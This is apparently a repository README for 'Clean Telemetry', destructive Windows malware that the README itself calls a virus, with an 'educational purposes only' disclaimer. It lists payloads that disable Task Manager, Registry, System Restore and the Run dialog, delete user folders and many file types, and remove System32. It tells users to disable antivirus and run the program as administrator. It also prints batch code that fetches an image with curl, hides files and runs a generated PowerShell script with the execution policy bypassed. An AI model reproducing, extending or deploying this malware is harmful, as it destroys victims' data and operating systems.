# ***I am not responsible for your actions. This repositories is for educational purposes only.***

## What is ?

Clean Telemetry is a virus that removes the system32 folder. 

It's open source you have .bat force the source and .exe .

#### [Video](https://youtu.be/MAVqU3mgNF0)

## Features :

You have two version for this moment :

Fast version :
- Kill Task Manager and Regedit.
- Deactives : Task Manager, Control Pannel, System Restore, Block taskBar, Run dialog (Win + R), Power Button and Registry.
-  Delete System32 folder.
- All this without a window, I create a vbs and bat file that runs with a task.

Slow version :
- Kill Task Manager and Regedit.
- Deactives : Task Manager, Control Pannel, System Restore, Block taskBar, Run dialog (Win + R), Power Button and Registry.
- Delete Folders : Documents, Downloads, Pictures, Videos, Music and Desktop (Current user logged)
- Delete all extension files : .jpeg, .txt, .png, .jpg, .iso, .msi, .avi, .wav, .mp3, .mp4, .mov, .exe and .psd
- Delete System32 folder.

## How to use :
Disable the AntiVirus and run the .bat or .exe as administrator.

## How to disable change of wallpaper

Delete this code

    mkdir "%windir%\RIP"
    attrib +i +h +s "%windir%\RIP"
    set ip=8.8.8.8
    ping -n 1 %ip% | find "TTL" 
    if not errorlevel 1 set error=win
    if errorlevel 1 set error=fail
    if %error% EQU fail (move rip.png %windir%\RIP\) else (curl -o "%windir%\RIP\rip.png" https://i.imgur.com/EGBHDer.png )
    attrib +i +h +s "%windir%\RIP\rip.png"
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d  "%windir%\RIP\rip.png" /f 
    powershell Set-ExecutionPolicy Bypass
    
    echo $imgPath="%windir%\RIP\rip.png" >> %windir%\wall.ps1
    echo $code = @' >> %windir%\wall.ps1
    echo using System.Runtime.InteropServices; >> %windir%\wall.ps1
    echo namespace Win32{ >> %windir%\wall.ps1
    echo      public class Wallpaper{ >> %windir%\wall.ps1
    echo         [DllImport("user32.dll", CharSet=CharSet.Auto)] >> %windir%\wall.ps1
    echo          static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; >> %windir%\wall.ps1
    echo          public static void SetWallpaper(string thePath){ >> %windir%\wall.ps1
    echo             SystemParametersInfo(20,0,thePath,3); >> %windir%\wall.ps1
    echo          } >> %windir%\wall.ps1
    echo     } >> %windir%\wall.ps1
    echo  } >> %windir%\wall.ps1
    echo '@>> %windir%\wall.ps1
    echo add-type $code >> %windir%\wall.ps1
    echo [Win32.Wallpaper]::SetWallpaper($imgPath) >> %windir%\wall.ps1
    attrib +i +h +s +r %windir%\wall.ps1
    powershell "& ""%windir%\wall.ps1"""

